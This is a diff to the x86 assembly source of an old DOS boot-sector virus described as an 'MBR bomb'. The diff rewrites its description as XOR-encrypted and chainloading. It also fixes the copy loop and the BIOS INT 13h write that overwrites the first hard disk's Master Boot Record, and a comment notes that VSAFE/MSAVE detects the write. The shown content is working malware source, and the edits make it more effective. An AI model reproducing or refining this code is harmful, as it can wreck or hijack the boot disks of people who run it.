@@ -5,8 +5,10 @@
 ;	Originally written in 1995.
 ;
 ; Description:
-; This virus is a MBR (Master Boot Record) bomb. It simply replaces the MBR of the
-; disk with the virus code.
+; This virus is an MBR (Master Boot Record) bomb, encrypted with an
+; XOR algorithm. It replaces the boot code in the disk's MBR while
+; preserving the partition table, and decrypts and chainloads the
+; active partition on boot.
 ;
 ; Disclaimer:
 ; I take no responsibility for any damage, either direct or implied,
@@ -50,18 +52,14 @@ BeginVirus:
 	mov	si, offset BeginMbrSection		; buffer
 	xor	di, di
 	mov	cx, (EndMbrSection-BeginMbrSection)	; ds:[fat]=>9f80:0000h
-	repe	movsb
-
-	mov	ax, 9f80h
-	mov	es, ax
+	rep	movsb
 
 	xor	bx, bx					; Replace the original
 	mov	ax, 0301h				; MBR on the disk by
 	xor	ch, ch					; the bomb
 	mov	dx, 0080h
 	mov	cl, 1					; WARNING, VSAFE/MSAVE
-	mov	bx, 0					; NOTICES THIS ACTION
-	int	13h
+	int	13h					; NOTICES THIS ACTION
 
 	int	20h					; End program
 
